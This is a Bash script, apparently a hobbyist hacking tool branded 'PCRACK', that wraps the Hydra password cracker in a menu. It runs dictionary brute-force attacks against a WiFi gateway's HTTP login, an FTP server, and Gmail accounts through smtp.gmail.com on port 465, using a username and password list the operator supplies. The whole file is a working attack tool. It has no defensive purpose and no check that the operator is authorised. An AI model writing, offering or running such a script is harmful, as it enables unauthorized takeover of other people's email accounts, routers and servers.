#!/bin/bash
# Copyright (c)2020 Tech-x. All right reserved.
# Creater Tech-X

# Color
red='\033[1;91m'
green='\033[1;92m'
blue='\033[1;34m'
cyan='\033[1;96m'
reset='\033[1;0m'

# choice variable declration

choice=""

# Banner 
banner () {
clear
echo ""
printf "${blue}"
printf "${blue}			██████╗ ${red} ██████╗██████╗  █████╗  ██████╗██╗  ██╗\n"
printf "${blue}			██╔══██╗${red}██╔════╝██╔══██╗██╔══██╗██╔════╝██║ ██╔╝\n"
printf "${blue}			██████╔╝${red}██║     ██████╔╝███████║██║     █████╔╝ \n"
printf "${blue}			██╔═══╝ ${red}██║     ██╔══██╗██╔══██║██║     ██╔═██╗ \n"
printf "${blue}			██║     ${red}╚██████╗██║  ██║██║  ██║╚██████╗██║  ██╗\n"
printf "${blue}			╚═╝     ${red} ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝\n"
printf "${reset}"
echo ""
}
# Checking Opearting System

detect_os () {

unamestr=`uname -o`

if [[ "$unamestr" == 'GNU/Linux' ]]; then
	if [ -e /bin/hydra ]; then
		printf "${green}Hydra is ok${reset}\n"
		sleep 1
		banner
	else
		printf "${blue}Installing package hydra.......${reset}\n"
		sleep 1
		sudo apt install hydra
	fi
elif [[ "$unamestr" == 'Android' ]]; then
	if [ -e ${PREFIX}/bin/hydra ]; then
		printf "${green}Hydra is ok${reset}\n"
		banner

	else
		printf "${blue}Installing hydra.........${reset}\n"
	fi
else
	echo "unknown"
fi

}

# Making cracking function with hydra package command 

# Choose option 
pcrack () {
printf "${blue}Choose an option ${reset}\n"
echo ""
printf "${green}[1]${blue}WiFi gateway login${reset}\n"
echo ""
printf "${green}[2]${blue}FTP login Panel${reset}\n"
echo ""
printf "${green}[3]${blue}G-Mail${reset}\n"
echo ""
printf "${red}[q]${blue}Quit${reset}\n"
echo ""
printf "${blue}Enter ${red}:~${reset}"
read choice
if [ "${choice}" = "1" ]; then
	banner
	printf "${blue}Enter username${red}:>${reset} "
	read usr
	echo ""
	printf "${blue}Enter passsword list path${red}:>${reset} "
	read pass
	echo ""
	printf "${blue}Enter gateway ip${red}:>${reset}  "
	read ip
		echo ""
		printf "${red}[*}${blue}Start cracking.......${reset}\n"
		sleep 1
		hydra -V -l $usr -P $pass $ip http-get

elif [ "${choice}" = "2" ]; then
	banner
	printf "${blue}Enter username${red}:>${reset} "
	read usr
	echo ""
	printf "${blue}Enter the Password list path${red}:>${reset} "
	read pass
	echo ""
	printf "${blue}Enter FTP ip${red}:>${reset} "
	read ip
		echo ""
		printf "${red}[*]${blue}Start cracking.....${reset}\n"
		sleep 1
		hydra -l $usr -P $pass $ip ftp

elif [ "${choice}" = "3" ]; then
	banner
	printf "${blue}Enter Gmail username${red}:>${reset} "
	read usr
	echo ""
	printf "${blue}Enter Password-list text file path${red}:>${reset} " 
	read pass
		echo ""
		printf "${red}[*]${blue}Start cracking password.....${reset}\n"
		sleep 1
		hydra -S -l $usr -P $pass -e ns -v -t10 -s  465 smtp.gmail.com smtp

elif [ "${choice}" = "q" ]; then

	printf "Exit..\n"
	clear
	exit 1
else 
printf "${red}Wrong Input${reset}\n"
sleep 1
banner
pcrack
fi
}
detect_os
pcrack
